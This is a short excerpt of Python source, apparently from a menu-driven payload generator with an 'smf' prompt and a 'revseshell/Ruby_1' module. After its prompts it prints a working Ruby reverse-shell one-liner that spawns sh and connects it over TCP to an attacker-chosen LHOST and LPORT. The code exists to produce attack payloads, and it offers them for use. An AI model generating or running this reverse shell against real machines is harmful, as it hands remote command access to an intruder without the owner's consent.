...
while True:  
    try:
        exin = input("\033[1;32msmf\033[1;34m(\033[1;31mrevseshell/Ruby_1\033[1;34m) > \033[1;32m")
...
while True:
                    exin2 = input("\033[1;31m(\033[1;34mrevseshell/Ruby_1\033[1;31m)> \033[1;32m")
...
time.sleep(1)
print(f"""
\033[1;32mruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{LHOST}",{LPORT}))'
""")
